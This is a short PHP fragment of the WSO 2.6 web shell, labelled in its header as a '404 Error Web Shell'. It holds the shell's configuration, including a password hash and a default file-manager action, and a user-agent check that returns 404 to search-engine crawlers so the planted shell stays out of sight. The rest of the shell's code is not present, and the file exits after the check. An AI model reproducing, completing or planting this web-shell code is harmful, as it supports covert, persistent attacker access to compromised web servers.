<?php 
/* WSO 2.6 (404 Error Web Shell by Madleets.com) */
/*Maded by DrSpy*/
$auth_pass = "db865c8fe9ea4aca8bd65f612abe2f9c"; 
$color = "#00ff00"; 
$default_action = 'FilesMan'; 
$default_use_ajax = true; 
$default_charset = 'Windows-1251'; 
  

$userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler"); 
if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) { 
    header('HTTP/1.0 404 Not Found'); 
} 


exit;
?>